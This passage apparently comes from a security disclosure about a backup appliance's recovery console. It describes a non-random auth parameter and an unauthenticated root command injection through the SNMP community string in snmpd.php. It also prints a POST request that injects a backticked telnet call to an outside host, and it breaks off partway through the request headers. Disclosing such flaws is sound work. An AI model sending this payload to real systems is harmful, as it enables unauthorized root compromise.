The largest one is likely the fact that the auth string used for authorization isnt random at all. After authentication , any requests made by the browser send no cookies and only check this auth param , which is completely insufficient. Because of this , unauthenticated users can know what the auth parameter should be and make requests as the root user. ， Unauthenticated root RCE ， Because the auth variable is not random , an unauthenticated user can post a specially crafted request to the /recoveryconsole/bpl/snmpd.php PHP script. This script does not sanitize the SNMP community string properly which allows the user to execute remote commands as the root user. A metasploit module that exploits this has been given alongside this report. Below is the actual request. To recreate , after authentication , click on Settings -> Clients , Networking , and Notifications -> SNMP and Modify the notpublic entry to contain bash metacharacters. ， POST /recoveryconsole/bpl/snmpd.php?type=update&sid=1&comm=notpublic`telnet+172.31.16.166+4444`&enabled=1&rx=4335379&ver=7.3.0&gcv=0 HTTP/1.1 ， Host : 172.31.16.99 ， User-Agent : Mozilla/5.0 ( X11 ; Ubuntu ; Linux x86_64 ; rv : 26.0 ) Gecko/20100101 Firefox/26.0 ， Accept : ",
